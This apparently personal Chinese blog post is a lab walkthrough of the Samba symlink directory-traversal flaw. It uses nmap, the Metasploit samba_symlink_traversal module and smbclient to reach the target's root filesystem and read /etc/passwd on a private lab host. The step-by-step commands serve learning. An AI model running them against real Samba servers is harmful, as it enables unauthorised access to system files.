---
title: sysmlink漏洞
date: 2021-12-20 16:32:26
tags: 
    - sysmlink
    - msf
---

## sysmlink 目录遍历漏洞

### 利用sysmlink漏洞读取目标主机的passwd文件内容

#### 原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。

### 过程：

使用`nmap -sV ip` 扫描主机，确认开放`445`，`139`端口且安装了`samba`服务，版本为3

![image-20211220165606561](https://121.5.125.62:88/image/sysmlink漏洞/image-20211220165606561.png)

命令行输入`search samba`，搜索samba的相关工具和载荷。

![image-20211220173445099](https://121.5.125.62:88/image/sysmlink漏洞/image-20211220173445099.png)

终端中输入`use auxiliary/admin/smb/samba_symlink_traversal`，启用漏洞利用模块

输入`info`，`"yes"`表示必须要填写的信息

![image-20211220173527544](https://121.5.125.62:88/image/sysmlink漏洞/image-20211220173527544.png)

输入`set RHOST 192.168.1.3`和`set SMBSHARE tmp`，设置主机ip地址和SAM可写文件

输入exploit开始攻击

![image-20211220173602852](https://121.5.125.62:88/image/sysmlink漏洞/image-20211220173602852.png)

新建终端，输入`smbclient //192.168.1.3/tmp`，直接回车，无密码

输入`cd rootfs`,进入rootfs目录，输入ls，列出目录

![image-20211220173635907](https://121.5.125.62:88/image/sysmlink漏洞/image-20211220173635907.png)

输入`more /etc/passwd`

![image-20211220173656794](https://121.5.125.62:88/image/sysmlink漏洞/image-20211220173656794-16399930170041.png)

此实验完成
